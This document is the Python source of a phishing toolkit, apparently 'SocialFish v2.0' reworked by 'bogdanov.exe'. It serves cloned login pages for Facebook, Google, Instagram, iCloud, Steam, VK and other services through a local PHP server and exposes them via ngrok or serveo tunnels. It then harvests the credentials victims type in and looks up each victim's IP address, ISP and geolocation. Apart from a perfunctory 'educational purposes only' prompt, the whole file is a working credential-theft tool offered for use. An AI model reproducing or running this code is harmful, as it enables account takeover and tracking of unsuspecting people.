#!/usr/bin/python3
#-*- coding: utf-8 -*-
#   SOCIALFISH v2.0
#     by: bogdanov
#
###########################
from time import sleep
from sys import stdout, exit
from os import system, path
from distutils.dir_util import copy_tree
import multiprocessing
from urllib.request import urlopen, quote, unquote
from platform import system as systemos, architecture
from wget import download
import re
import json
from subprocess import check_output


RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print ('''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|
                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
'''.format(RED, END))
     exit(0)
    
def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print('[*] Downloading Ngrok...')
        if 'Android' in str(check_output(('uname', '-a'))):
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            ostype = systemos().lower()
            if architecture()[0] == '64bit':
                filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
            else:
                filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print ('''
         
  _                     _                        
 | |__   ___   __ _  __| | __ _ _ __   _____   __
 | '_ \ / _ \ / _` |/ _` |/ _` | '_ \ / _ \ \ / /
 | |_) | (_) | (_| | (_| | (_| | | | | (_) \ V / 
 |_.__/ \___/ \__, |\__,_|\__,_|_| |_|\___/ \_/  
              |___/                              

               {0}[NOW WITH LIVE VICTIM ATTACK INFORMATION ]
{1}[ {0} Надеюсь вы в восторге,и расшарите это создание.
         Я здесь 
         Instagram:@bogdanov.exe
         Telegram:t.me/bogdanov_tm
[ {0} reworked by bogdanov.exe]\n'''.format(GREEN, END, CYAN))

def loadModule(module):
       print ('''{0}
   _.-=-._     .-,
 .'       "-.,' /
( bogdanov  _.  <
 `=.____.="  `._\\


 [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module)

def runPhishing(social, option2):
    system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
    if option2 == '1' and social == 'Facebook':
        copy_tree("WebPages/fb_standard/", "Server/www/")
    if option2 == '2' and social == 'Facebook':
        copy_tree("WebPages/fb_advanced_poll/", "Server/www/")
    if option2 == '3' and social == 'Facebook':
        copy_tree("WebPages/fb_security_fake/", "Server/www/")
    if option2 == '4' and social == 'Facebook':
        copy_tree("WebPages/fb_messenger/", "Server/www/")
    elif option2 == '1' and social == 'Google':
        copy_tree("WebPages/google_standard/", "Server/www/")
    elif option2 == '2' and social == 'Google':
        copy_tree("WebPages/google_advanced_poll/", "Server/www/")
    elif option2 == '3' and social == 'Google':
        copy_tree("WebPages/google_advanced_web/", "Server/www/")
    elif social == 'LinkedIn':
        copy_tree("WebPages/linkedin/", "Server/www/")
    elif social == 'GitHub':
        copy_tree("WebPages/GitHub/", "Server/www/")
    elif social == 'StackOverflow':
        copy_tree("WebPages/stackoverflow/", "Server/www/")
    elif social == 'WordPress':
        copy_tree("WebPages/wordpress/", "Server/www/")
    elif social == 'Twitter':
        copy_tree("WebPages/twitter/", "Server/www/")
    elif social == 'Snapchat':
        copy_tree("WebPages/Snapchat_web/", "Server/www/")
    elif social == 'Yahoo':
        copy_tree("WebPages/yahoo_web/", "Server/www/")
    elif social == 'Twitch':
        copy_tree("WebPages/twitch/", "Server/www/")
    elif social == 'Microsoft':
        copy_tree("WebPages/live_web/", "Server/www/")
    elif social == 'Steam':
        copy_tree("WebPages/steam/", "Server/www/")
    elif social == 'iCloud':
        copy_tree("WebPages/iCloud/", "Server/www/")    
    elif option2 == '1' and social == 'Instagram':
        copy_tree("WebPages/Instagram_web/", "Server/www/")
    elif option2 == '2' and social == 'Instagram':
        copy_tree("WebPages/Instagram_autoliker/", "Server/www/")
    elif option2 == '1' and social == 'VK':
        copy_tree("WebPages/VK/", "Server/www/")
    elif option2 == '2' and social == 'VK':
        copy_tree("WebPages/VK_poll_method/", "Server/www/")







def waitCreds():
    print ("{0}[{1}*{0}]{1} done | host is up ".format(RED, END))

    print ('''{0}
   _.-=-._     .-,
 .'       "-.,' /
(  bogdanov_  ~.<
 `=.____.="  `._\\

 [{1}*{0}]{1} NOW YOU WILL GET YOUR VICTIM'S LIVE INFORMATION .
 [{1}*{0}]{1} GET VICTIM'S IP ADDRESS, ISP, GEOLOCATION, CITY, COUNTRY, AND MANY MORE STUFF.{0}'''.format(CYAN, END))

    print (" {0}[{1}*{0}]{1} Waiting for credentials & victim's info... \n".format(RED, END))
    while True:

        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                print ('======================================================================'.format(RED, END))
                print (' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
                system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                print ('======================================================================'.format(RED, END))
                print (' {0}GOTCHA!You are done! but SuslaLOX{1}\n {0}{1}'.format(RED, END))

        creds.close()


        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
                resp = urlopen('https://ipinfo.io/%s/json' % ip)
                ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                if 'bogon' in ipinfo:
                    print ('======================================================================'.format(RED, END))
                    print (' \n{0}[ VICTIM IP BOGUS ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
                else:
                    matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                    latitude = matchObj.group(1)
                    longitude = matchObj.group(2)
                    print ('======================================================================'.format(RED, END))
                    print (' \n{0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines)
                    print (' \n{0}Longitude: %s \nLatitude: %s{1}'.format(GREEN, END) % (longitude, latitude))
                    print (' \n{0}Internet Provider: %s \nCountry: %s{1}'.format(GREEN, END) % (ipinfo['org'], ipinfo['country']))
                    print (' \n{0}Region: %s \nCity: %s{1}'.format(GREEN, END) % (ipinfo['region'], ipinfo['city']))
                system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
                print ('======================================================================'.format(RED, END))

        creds.close()


def runPEnv():
    system('clear')
    print ('''           {2}-{1} bogdanov.exe {2}|{1} bogdanov.exe {2}|{1} bogdanov.exe {2}- UKRAINE
                       .   .  .
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██
  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██
  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████
       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {1}v0.1{2}
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '  {1}REWORKED BY bogdanov.exe_{2}
                     '        {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
                       ' .  '
                           '
                             {1}'''.format(GREEN, END, CYAN))

    for i in range(101):
        sleep(0.2)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
        stdout.flush()

    print ("\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END))
    if 256 != system('which php'):
        print (" --{0}>{1} FOUND.".format(CYAN, END))
    else:
        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(RED, END))
        exit(0)
    if input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}bogdanov.exe > {1}".format(RED, END, CYAN)).upper() != 'Y':
        system('clear')
        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, END))
        exit(0)
    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With bogdanov.exe !\n\n {0}bogdanov.exe >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}bogdanov.exe > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}bogdanov.exe > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIn')
        option2 = ''
        runPhishing('LinkedIn', option2)
    elif option == '4':
        loadModule('GitHub')
        option2 = ''
        runPhishing('GitHub', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    elif option == '7':
        loadModule('Twitter')
        option2 = ''
        runPhishing('Twitter', option2)
    elif option == '8':
        loadModule('Instagram')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}bogdabov.exe > {1}".format(CYAN, END))
        runPhishing('Instagram', option2)
    elif option == '9':
        loadModule('Snapchat')
        option2 = ''
        runPhishing('Snapchat', option2)
    elif option == '10':
        loadModule('Yahoo')
        option2 = ''
        runPhishing('Yahoo', option2)
    elif option == '11':
        loadModule('Twitch')
        option2 = ''
        runPhishing('Twitch', option2)
    elif option == '12':
        loadModule('Microsoft')
        option2 = ''
        runPhishing('Microsoft', option2)
    elif option == '13':
        loadModule('Steam')
        option2 = ''
        runPhishing('Steam', option2)
    elif option == '14':
        loadModule('VK')
        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}bogdanov.exe > {1}".format(CYAN, END))
        runPhishing('VK', option2)
    elif option == '15':
        loadModule('iCloud')
        option2 = ''
        runPhishing('iCloud', option2)    
    else:
        exit(0)


    
def serveo():
    system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
    sleep(10)
    f = open('sendlink.txt', 'r')
    a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
    lst = []
    for line in f:
    	for word in a:
            if word in line:
            	line = line.replace(word,'')	    	
    	lst.append(line)
    f.close()
    f = open('sendlink.txt','w')
    for line in lst:
    	f.write(line)
    f.close()
    url = open('sendlink.txt', 'r')    
    print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
    url.close()
        

def runNgrok():
    system('./Server/ngrok http 1111 > /dev/null &')
    sleep(10)
    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print("\n {0}[{1}*{0}]{1} Ngrok URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
    url.close()
    
    
def runServer():
    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")

    




if __name__ == "__main__":
    try:
        runPEnv()
        def server():
                print("\n Server you want to use".format(CYAN, END))
                print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, END))
                choice = input(" \n {0}bogdanov > {1}".format(CYAN, END))
                if choice == '1':
                    runNgrok()
                elif choice == '2':
                    serveo()
                else:
                    system('clear')
                    return server()
        server()
        multiprocessing.Process(target=runServer).start()
        waitCreds()





           

    except KeyboardInterrupt:        
        system('pkill -f ssh')
        system('pkill -f php')
        system('pkill -f ngrok')
        end()
        exit(0)
